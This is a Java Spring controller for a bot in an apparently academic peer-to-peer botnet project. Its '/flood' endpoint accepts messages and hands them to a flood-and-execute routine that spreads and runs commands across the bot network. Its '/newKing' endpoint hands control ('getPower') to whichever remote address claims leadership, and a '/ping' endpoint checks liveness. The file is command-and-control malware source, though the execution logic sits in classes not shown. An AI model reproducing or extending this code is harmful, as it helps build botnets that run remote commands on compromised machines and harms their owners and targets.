package cs.sii.controller;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import cs.sii.bot.action.Auth;
import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.service.connection.NetworkService;

//Controller del Bot che gestisce le richieste della rete P2P dei Bot 

@Component
@RestController
@RequestMapping("/bot")
public class BotController {

	@Autowired
	Config engineBot;

	@Autowired
	Auth crypto;

	@Autowired
	Behavior bhv;

	@Autowired
	NetworkService nServ;

	@RequestMapping("/")
	public String index() {
		return "Bot is Ready";
	}

	@RequestMapping("/flood")
	public Boolean msgFlood(@RequestParam String msg) {

		// per efficienza chiamo un metodo asincrono e rispondo che ho ricevuto
		// il msg
		// tutto il resto avviene nella in Flood&Execute
		bhv.floodAndExecute(msg);

		return true;
	}

	@RequestMapping("/newKing")
	public Boolean newKing(HttpServletRequest req) {
		if (nServ.isElegible()) {
			
			//TODO scegliere quello giusto
			System.out.println("addr: "+req.getRemoteAddr());
			System.out.println("host: "+req.getRemoteHost());

		bhv.getPower(req.getRemoteAddr());
			return true;
		} else {
			return false;
		}
	}

	@RequestMapping("/ping")
	public Boolean ping() {
		return true;
	}

}
